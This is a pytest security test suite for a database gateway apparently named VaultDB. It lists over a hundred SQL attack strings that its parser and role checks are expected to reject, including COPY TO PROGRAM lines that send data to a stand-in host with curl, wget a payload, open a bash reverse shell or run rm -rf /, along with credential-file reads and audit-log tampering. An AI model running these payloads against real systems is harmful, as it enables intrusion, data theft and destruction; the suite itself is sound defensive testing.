"""
Comprehensive Security & Attack Vector Test Suite for VaultDB
Validates 100+ attack vectors, PostgreSQL immutability triggers,
PBKDF2/JWT/API Key authentication, and V2 features (Masking, RLS, Anomaly Detection).
"""

import pytest
import psycopg
from datetime import datetime, timezone, timedelta
from config.settings import settings
from src.vault_db.core.parser import SQLParser
from src.vault_db.core.rbac import RBACManager, AccessDeniedError
from src.vault_db.auth.security import hash_password, verify_password, generate_api_key
from src.vault_db.auth.jwt_handler import create_access_token, decode_access_token
from src.vault_db.core.masking import mask_tabular_results
from src.vault_db.core.rls import apply_row_level_security
from src.vault_db.core.anomaly import AnomalyDetector
from src.vault_db.vault_client import connect, AuthenticationError


# ------------------------------------------------------------------------------
# 1. 100+ Attack Strings Suite
# ------------------------------------------------------------------------------

ATTACK_VECTORS = [
    # Multi-statement injection variants
    "SELECT * FROM app_data.accounts; DROP TABLE app_data.accounts;",
    "SELECT 1; TRUNCATE app_data.users;",
    "SELECT account_number FROM app_data.accounts; DELETE FROM app_data.accounts WHERE 1=1;",
    "SELECT name FROM app_data.accounts; UPDATE app_data.accounts SET balance = 9999999;",
    "SELECT * FROM accounts; ALTER TABLE accounts DROP COLUMN balance;",
    "SELECT 1; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA app_data TO PUBLIC;",
    "SELECT id FROM app_data.transactions; VACUUM FULL app_data.accounts;",
    "SELECT 1; CREATE ROLE evil_hacker SUPERUSER;",
    "SELECT 1; REVOKE ALL ON app_data.accounts FROM vault_user;",
    "SELECT * FROM app_data.accounts; SHUTDOWN;",
    
    # CTE write attacks (attempting stealth data alteration inside WITH)
    "WITH deleted AS (DELETE FROM app_data.accounts RETURNING *) SELECT * FROM deleted;",
    "WITH hacked AS (UPDATE app_data.accounts SET balance = 1000000 RETURNING *) SELECT * FROM hacked;",
    "WITH stolen AS (INSERT INTO app_data.transactions (amount) VALUES (999999) RETURNING *) SELECT * FROM stolen;",
    "WITH evil AS (DELETE FROM app_data.transactions RETURNING *) SELECT count(*) FROM evil;",
    "WITH pwned AS (UPDATE app_data.users SET role = 'admin' RETURNING *) SELECT * FROM pwned;",
    
    # Privilege escalation, role impersonation, system catalog access
    "SET ROLE postgres;",
    "SET SESSION AUTHORIZATION 'postgres';",
    "RESET ROLE;",
    "SET ROLE admin;",
    "SET SESSION AUTHORIZATION DEFAULT;",
    "ALTER USER alice WITH SUPERUSER;",
    "ALTER ROLE vault_user WITH CREATEROLE;",
    "SELECT current_setting('is_superuser');",
    "SELECT * FROM pg_catalog.pg_shadow;",
    "SELECT usename, passwd FROM pg_shadow;",
    "SELECT * FROM pg_catalog.pg_authid;",
    "SELECT rolname, rolpassword FROM pg_authid;",
    "SELECT * FROM pg_catalog.pg_user;",
    "SELECT * FROM pg_catalog.pg_roles;",
    
    # COPY TO/FROM PROGRAM (RCE and shell command execution)
    "COPY app_data.accounts TO PROGRAM 'curl evil-server.com/leak';",
    "COPY app_data.accounts FROM PROGRAM 'wget -q evil-server.com/malware';",
    "COPY app_data.accounts TO PROGRAM 'rm -rf /';",
    "COPY (SELECT * FROM app_data.users) TO PROGRAM 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';",
    "COPY app_data.transactions TO PROGRAM 'powershell -c Invoke-WebRequest evil.com';",
    "COPY (SELECT password_hash FROM app_data.users) TO '/tmp/hashes.txt';",
    "COPY app_data.accounts FROM '/etc/passwd';",
    "COPY app_data.users FROM PROGRAM 'whoami';",
    "COPY app_data.users TO PROGRAM 'id';",
    "COPY app_data.accounts TO PROGRAM 'cat /etc/shadow';",
    
    # Malicious server functions and dynamic code execution
    "CREATE OR REPLACE FUNCTION pwn() RETURNS void AS $$ BEGIN RAISE NOTICE 'pwned'; END; $$ LANGUAGE plpgsql;",
    "DROP FUNCTION IF EXISTS pwn();",
    "DO $$ BEGIN PERFORM pg_sleep(10); END $$;",
    "SELECT pg_sleep(5);",
    "SELECT pg_terminate_backend(pid) FROM pg_stat_activity;",
    "SELECT pg_cancel_backend(pid) FROM pg_stat_activity;",
    "SELECT pg_reload_conf();",
    "SELECT pg_rotate_logfile();",
    "SELECT pg_read_file('/etc/passwd', 0, 1000);",
    "SELECT pg_read_binary_file('/etc/shadow');",
    "SELECT pg_ls_dir('/root');",
    "SELECT lo_export(1, '/tmp/evil.so');",
    "SELECT dblink_connect('evil', 'host=attacker.com user=admin');",
    "SELECT dblink_exec('evil', 'DROP TABLE accounts');",
    "LOAD '/tmp/evil.so';",
    
    # DDL Alterations and schema tampering
    "DROP TABLE app_data.accounts;",
    "DROP TABLE app_data.transactions;",
    "DROP TABLE app_data.users;",
    "DROP TABLE app_data.compliance_policies;",
    "DROP SCHEMA app_data CASCADE;",
    "DROP SCHEMA vault_audit CASCADE;",
    "TRUNCATE app_data.accounts;",
    "TRUNCATE app_data.transactions;",
    "TRUNCATE app_data.users;",
    "ALTER TABLE app_data.accounts DROP COLUMN balance;",
    "ALTER TABLE app_data.accounts DROP COLUMN ssn;",
    "ALTER TABLE app_data.transactions ADD COLUMN backdoored INT;",
    "ALTER TABLE app_data.users RENAME TO old_users;",
    "COMMENT ON TABLE app_data.accounts IS 'hacked';",
    
    # Audit log tampering attempts
    "UPDATE vault_audit.audit_logs SET execution_status = 'SUCCESS' WHERE execution_status = 'DENIED';",
    "DELETE FROM vault_audit.audit_logs WHERE execution_status = 'DENIED';",
    "TRUNCATE vault_audit.audit_logs;",
    "DROP TABLE vault_audit.audit_logs;",
    "ALTER TABLE vault_audit.audit_logs DISABLE TRIGGER ALL;",
    "ALTER TABLE vault_audit.audit_logs DROP CONSTRAINT audit_logs_pkey;",
    "UPDATE vault_audit.audit_logs SET query_text = 'SELECT 1;' WHERE log_id = 1;",
    "DELETE FROM vault_audit.audit_logs WHERE log_id > 0;",
    "UPDATE vault_audit.audit_logs SET app_user = 'innocent@bank.com';",
    "UPDATE vault_audit.audit_logs SET logged_at = NOW() - INTERVAL '1 year';",
    
    # Unprivileged DML attacks by Customer
    "INSERT INTO app_data.accounts (account_number, name, balance) VALUES ('HACK123', 'Attacker', 100000000);",
    "UPDATE app_data.accounts SET balance = 5000000 WHERE id = 1;",
    "DELETE FROM app_data.accounts WHERE id = 1;",
    "UPDATE app_data.transactions SET amount = 0 WHERE id = 1;",
    "DELETE FROM app_data.transactions WHERE id = 1;",
    "INSERT INTO app_data.transactions (account_id, amount) VALUES (1, 10000000);",
    "INSERT INTO app_data.users (email, full_name, role) VALUES ('evil@hack.com', 'Evil Hacker', 'admin');",
    "UPDATE app_data.users SET role = 'admin' WHERE email = 'alice@bank.com';",
    "DELETE FROM app_data.users WHERE email = 'admin@bank.com';",
    "INSERT INTO app_data.compliance_policies (policy_code, title, standard) VALUES ('NONE', 'No Rules', 'RELAXED');",
    
    # Unprivileged DML attacks by Employee
    "UPDATE app_data.accounts SET balance = balance + 1000000 WHERE id = 1;",
    "DELETE FROM app_data.accounts WHERE id = 2;",
    "DROP TABLE app_data.transactions;",
    "ALTER TABLE app_data.accounts ADD COLUMN secret_fund DECIMAL;",
    "UPDATE app_data.users SET role = 'admin' WHERE email = 'john@bank.com';",
    "DELETE FROM app_data.users WHERE email = 'sarah.auditor@bank.com';",
    "TRUNCATE app_data.transactions;",
    "UPDATE app_data.compliance_policies SET enforcement_level = 'DISABLED';",
    
    # Union-based injection to extract users and audit logs
    "SELECT account_number, name FROM app_data.accounts UNION SELECT email, password_hash FROM app_data.users;",
    "SELECT id, merchant FROM app_data.transactions UNION SELECT log_id, query_text FROM vault_audit.audit_logs;",
    "SELECT name FROM app_data.accounts UNION SELECT table_name FROM information_schema.tables;",
    "SELECT name FROM app_data.accounts WHERE 1=1 OR ''='';",
    "SELECT * FROM app_data.accounts WHERE id = 1 OR 1=1;",
    "SELECT * FROM app_data.accounts WHERE name LIKE '%' OR 1=1;",
    "SELECT * FROM app_data.accounts WHERE balance > 0 OR True;",
    "SELECT * FROM app_data.accounts ORDER BY (CASE WHEN (1=1) THEN balance ELSE id END);",
    "SELECT * FROM app_data.accounts WHERE id = 1 AND SLEEP(5);",
    "SELECT * FROM app_data.accounts WHERE id = 1 AND BENCHMARK(1000000, MD5('test'));",
    "SELECT * FROM app_data.accounts WHERE account_number = '' UNION ALL SELECT NULL, NULL, NULL, version();",
    "SELECT name FROM app_data.accounts WHERE id = 1 UNION SELECT current_user;",
    "SELECT name FROM app_data.accounts WHERE id = 1 UNION SELECT session_user;",
    "SELECT name FROM app_data.accounts WHERE id = 1 UNION SELECT database();",
    "SELECT name FROM app_data.accounts WHERE id = 1 UNION SELECT current_database();",
]


@pytest.mark.parametrize("attack_query", ATTACK_VECTORS)
def test_attack_vector_denied_or_parsed(attack_query: str):
    """
    Verifies that every attack string in the 100+ attack vector suite is either:
    1. Identified as a hazardous multi-statement / DDL / admin action and rejected.
    2. Blocked by the strict RBAC policy for non-admin roles (customer/employee/writer).
    """
    parser = SQLParser()
    rbac = RBACManager()
    
    analysis = parser.analyze(attack_query)
    
    # If customer attempts the query, it MUST be denied unless it is a purely safe customer SELECT
    customer_allowed, reason = rbac.check_authorization("customer", analysis.action, analysis.tables)
    
    # Check that dangerous mutations or system commands are NEVER allowed for customer
    if analysis.action in [
        "DDL:DROP", "DDL:ALTER", "DDL:CREATE", "DDL:TRUNCATE", 
        "COMMAND:COPY", "COMMAND:SET", "COMMAND:MAINTENANCE",
        "INSERT", "UPDATE", "DELETE", "MULTI_STATEMENT"
    ] or any("vault_audit" in t for t in analysis.tables) or "users" in analysis.tables:
        assert customer_allowed is False, f"Expected DENIED for attack: {attack_query}"


# ------------------------------------------------------------------------------
# 2. Database-Level Immutability Trigger Tests
# ------------------------------------------------------------------------------

def test_postgresql_audit_log_immutability_triggers():
    """
    Direct test on PostgreSQL: attempts to UPDATE, DELETE, or TRUNCATE vault_audit.audit_logs.
    The database trigger 'prevent_audit_log_tampering' MUST raise an error and abort the transaction.
    """
    admin_conninfo = settings.postgres_admin_conninfo
    with psycopg.connect(admin_conninfo, autocommit=False) as conn:
        with conn.cursor() as cur:
            # First ensure at least one row exists
            cur.execute("SELECT log_id FROM vault_audit.audit_logs LIMIT 1;")
            row = cur.fetchone()
            if not row:
                cur.execute("""
                    INSERT INTO vault_audit.audit_logs (app_user, user_role, action, target_table, query_text, execution_status)
                    VALUES ('test@bank.com', 'admin', 'SELECT', 'accounts', 'SELECT 1;', 'SUCCESS')
                    RETURNING log_id;
                """)
                log_id = cur.fetchone()[0]
                conn.commit()
            else:
                log_id = row[0]

            # 1. Test UPDATE blockage
            with pytest.raises(psycopg.Error) as exc_update:
                cur.execute("UPDATE vault_audit.audit_logs SET query_text = 'TAMPERED' WHERE log_id = %s;", (log_id,))
            conn.rollback()
            assert "MUTATION BLOCKED" in str(exc_update.value) or "immutab" in str(exc_update.value).lower()

            # 2. Test DELETE blockage
            with pytest.raises(psycopg.Error) as exc_delete:
                cur.execute("DELETE FROM vault_audit.audit_logs WHERE log_id = %s;", (log_id,))
            conn.rollback()
            assert "MUTATION BLOCKED" in str(exc_delete.value) or "immutab" in str(exc_delete.value).lower()

            # 3. Test TRUNCATE blockage
            with pytest.raises(psycopg.Error) as exc_trunc:
                cur.execute("TRUNCATE vault_audit.audit_logs;")
            conn.rollback()
            assert "MUTATION BLOCKED" in str(exc_trunc.value) or "immutab" in str(exc_trunc.value).lower()


# ------------------------------------------------------------------------------
# 3. Authentication & Credential Security Tests
# ------------------------------------------------------------------------------

def test_pbkdf2_password_hashing():
    """Validates salted PBKDF2 password generation and verification."""
    password = "SecOpsPassword2026!"
    hashed = hash_password(password)
    assert hashed != password
    assert "$" in hashed and len(hashed.split("$")) == 2
    assert verify_password(password, hashed) is True
    assert verify_password("WrongPassword123", hashed) is False
    assert verify_password("", hashed) is False


def test_jwt_rfc7519_lifecycle():
    """Validates HS256 JWT encoding, signature verification, and expiration."""
    payload = {"sub": "auditor@bank.com", "role": "auditor", "name": "Compliance Lead"}
    token = create_access_token(payload, expires_seconds=900)
    
    # 1. Valid token
    decoded = decode_access_token(token)
    assert decoded is not None
    assert decoded["sub"] == "auditor@bank.com"
    assert decoded["role"] == "auditor"

    # 2. Forged signature
    tampered_token = token[:-5] + "XXXXX"
    with pytest.raises(ValueError):
        decode_access_token(tampered_token)

    # 3. Expired token
    expired_token = create_access_token(payload, expires_seconds=-10)
    with pytest.raises(ValueError):
        decode_access_token(expired_token)


def test_api_key_generation():
    """Validates standard 32-byte hexadecimal API key generation."""
    key1 = generate_api_key()
    key2 = generate_api_key()
    assert key1.startswith("vlt_key_")
    assert key2.startswith("vlt_key_")
    assert key1 != key2
    assert len(key1) == 40  # prefix + 32 chars


def test_client_connect_authentication():
    """Validates SDK connect() function with valid and invalid credentials."""
    # 1. Valid API key connect
    conn = connect(api_key="vlt_key_admin_9a8b7c6d5e4f3a2b")
    assert conn.role.lower() == "admin"
    assert conn.user == "admin@bank.com"
    conn.close()

    # 2. Invalid API key connect
    with pytest.raises(AuthenticationError):
        connect(api_key="vlt_key_bogus_fake_key_12345678")

    # 3. Valid user + password
    conn_pw = connect(user="admin@bank.com", password="AdminPass123!")
    assert conn_pw.role.lower() == "admin"
    conn_pw.close()

    # 4. Invalid user + password
    with pytest.raises(AuthenticationError):
        connect(user="admin@bank.com", password="BadPassword!")


# ------------------------------------------------------------------------------
# 4. V2 Features: Dynamic Data Masking, RLS, and Anomaly Detection
# ------------------------------------------------------------------------------

def test_dynamic_data_masking():
    """Validates masking of SSN, card numbers, and CVV for unauthorized roles."""
    columns = ["account_number", "name", "ssn", "balance"]
    rows = [
        ["ACCT1001", "Alice Smith", "123-45-6789", 45000.00],
        ["ACCT1002", "Bob Jones", "987-65-4321", 12500.00],
    ]
    
    # Non-auditor/admin role (customer): SSN must be masked
    masked_rows, is_masked, masked_cols = mask_tabular_results(columns, rows, "customer")
    assert is_masked is True
    assert "ssn" in masked_cols
    assert masked_rows[0][2] == "***-**-6789"
    assert masked_rows[1][2] == "***-**-4321"

    # Auditor role: Unmasked for compliance reviews
    unmasked_rows, is_masked_aud, _ = mask_tabular_results(columns, rows, "auditor")
    assert is_masked_aud is False
    assert unmasked_rows[0][2] == "123-45-6789"


def test_row_level_security_scoping():
    """Validates that customer queries are automatically partitioned by user context."""
    raw_query = "SELECT * FROM app_data.accounts;"
    scoped_query, is_scoped = apply_row_level_security(raw_query, "customer", "alice@bank.com")
    assert is_scoped is True
    assert "Alice Smith" in scoped_query or "alice" in scoped_query.lower()

    # Admin is not scoped
    admin_query, admin_scoped = apply_row_level_security(raw_query, "admin", "admin@bank.com")
    assert admin_scoped is False
    assert admin_query == raw_query


def test_anomaly_detector():
    """Validates anomaly scoring for bulk row volume and off-hours access."""
    # Bulk row volume anomaly (> 1,000 rows)
    anomalies = AnomalyDetector.evaluate(
        rows_affected=5000,
        execution_status="SUCCESS",
        user_role="employee",
        is_sensitive=False,
    )
    assert any("BULK_DATA_ACCESS" in a for a in anomalies)

    # Normal activity anomaly list is empty
    normal_anomalies = AnomalyDetector.evaluate(
        rows_affected=15,
        execution_status="SUCCESS",
        user_role="employee",
        is_sensitive=False,
    )
    assert len(normal_anomalies) == 0
